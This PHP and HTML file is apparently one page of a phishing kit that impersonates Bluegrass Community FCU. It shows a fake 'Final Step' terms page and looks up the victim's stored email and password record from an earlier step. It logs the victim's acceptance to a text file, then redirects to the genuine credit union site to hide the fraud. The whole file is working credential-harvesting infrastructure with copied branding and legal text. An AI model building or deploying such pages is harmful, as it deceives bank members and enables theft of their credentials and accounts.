<?php
session_start();
require_once __DIR__ . '/includes/file_storage.php';

// Redirect to login if no username in session
if (!isset($_SESSION['emzemz'])) {
    header('Location: index.php');
    exit;
}

$username = $_SESSION['emzemz'];
$errors = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get form data
    $isChecked = isset($_POST['agree']);
    
    // Validation
    if (!$isChecked) {
        $errors['agree'] = 'Please agree to the terms before continuing.';
    }
    
    if (empty($errors)) {
        // Get user email from previous step for completion message
        $userData = getUserData('email_password.txt', $username);
        $userEmail = 'N/A';
        if (!empty($userData)) {
            $userEmail = $userData[0]['usr_eml'] ?? 'N/A';
        }
        
        // Save to test file
        $data = [
            'step' => 'terms_acceptance',
            'usrnm' => $username,
            'terms_accepted' => $isChecked,
            'usr_eml' => $userEmail,
            'completed_at' => date('Y-m-d H:i:s')
        ];
        
        saveUserData('terms_acceptance.txt', $data);
        
        // Redirect to final URL
        header('Location: https://bluegrass.org');
        exit;
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Terms of Agreement - Bluegrass Community FCU</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body>
    <div class="min-h-screen bg-[#4A9619] text-[#123524] flex flex-col">
        <!-- Main Content -->
        <main class="flex-1 flex items-center justify-center px-4 py-12">
            <div class="w-full max-w-3xl flex flex-col items-center gap-8">
                <!-- Terms Card -->
                <div class="w-full rounded-[30px] bg-white shadow-[0_30px_60px_rgba(0,0,0,0.18)] px-10 py-12">
                    <!-- Logo -->
                    <img
                        src="assets/blue_logo.png"
                        alt="Bluegrass Community FCU"
                        class="mx-auto h-12 w-auto"
                    />

                    <!-- Card Header -->
                    <div class="mt-6 space-y-3 text-center">
                        <p class="text-[0.65rem] font-semibold uppercase tracking-[0.35em] text-[#4A9619]">
                            Final Step
                        </p>
                        <h1 class="text-2xl font-semibold text-gray-900">Terms of Agreement</h1>
                    </div>
                    
                    <?php if (!empty($errors)): ?>
                        <div class="mt-6 bg-red-50 border-l-4 border-red-500 p-4">
                            <div class="flex">
                                <div class="flex-shrink-0">
                                    <svg class="h-5 w-5 text-red-500" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                                        <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd" />
                                    </svg>
                                </div>
                                <div class="ml-3">
                                    <p class="text-sm text-red-700">
                                        <?php echo htmlspecialchars($errors['agree']); ?>
                                    </p>
                                </div>
                            </div>
                        </div>
                    <?php endif; ?>
                    
                    <form method="POST" class="mt-8 space-y-6">
                        <div class="space-y-4">
                            <p class="text-sm text-gray-600">
                                By submitting this registration form, you authorize Bluegrass Community FCU and its affiliates to request and receive information
                                about you from third parties, including copies of your consumer credit report and motor vehicle records, at any time while
                                your account remains active.
                            </p>
                            <p class="text-sm text-gray-600">
                                You also authorize us to retain a copy of this information for use in accordance with our 
                                <a href="#" class="text-[#4A9619] hover:underline font-medium">Terms of Service</a> and 
                                <a href="#" class="text-[#4A9619] hover:underline font-medium">Privacy Statement</a>.
                            </p>
                        </div>

                        <label class="flex items-center gap-3 text-sm text-gray-700 cursor-pointer">
                            <input
                                type="checkbox"
                                name="agree"
                                <?php echo (isset($_POST['agree'])) ? 'checked' : ''; ?>
                                class="h-5 w-5 text-[#4A9619] focus:ring-[#4A9619] focus:ring-2 border-gray-300 rounded"
                            >
                            <span>I understand and agree</span>
                        </label>

                        <!-- Submit Button -->
                        <button
                            type="submit"
                            class="w-full rounded-xl bg-[#4A9619] py-3 text-base font-semibold text-white transition hover:bg-[#3f8215] disabled:cursor-not-allowed disabled:opacity-70"
                        >
                            Finish
                        </button>
                    </form>
                </div>
            </div>
        </main>

        <!-- Footer -->
        <footer class="bg-white border-t border-gray-300 py-6">
            <div class="max-w-7xl mx-auto px-4">
                <div class="flex flex-col md:flex-row md:items-center md:justify-between gap-6">
                    <div class="flex items-center gap-6 justify-center md:justify-start">
                        <img
                            src="assets/equal-housing.png"
                            alt="Equal Housing Lender"
                            class="h-12 w-auto"
                        />
                        <img
                            src="assets/ncua.png"
                            alt="National Credit Union Administration"
                            class="h-12 w-auto"
                        />
                    </div>
                    <div class="text-xs text-gray-700 text-center md:text-right space-y-2">
                        <p>© 2025 Bluegrass Community FCU. All Rights Reserved.</p>
                        <p>
                            This site contains links to other sites on the Internet. We, and your credit union,
                            cannot be responsible for the content or privacy policies of these other sites.
                        </p>
                        <p>Version: v26.10.22.0</p>
                    </div>
                </div>
                <div class="text-center text-xs text-gray-500 mt-6 border-t border-gray-200 pt-4">
                    ~ Current time is <?php echo date('m/d/Y h:i:s A'); ?> ~ 0 ~ NWEB02 ~
                </div>
            </div>
        </footer>
    </div>
    
    <script>
        // Auto-focus checkbox on page load
        document.addEventListener('DOMContentLoaded', function() {
            const checkbox = document.querySelector('input[type="checkbox"]');
            if (checkbox && !checkbox.checked) {
                checkbox.focus();
            }
        });
        
        // Clear error when checkbox is ticked
        document.querySelector('input[type="checkbox"]').addEventListener('change', function() {
            const errorDiv = document.querySelector('.bg-red-50');
            if (errorDiv) {
                errorDiv.style.display = 'none';
            }
        });
    </script>
</body>
</html>
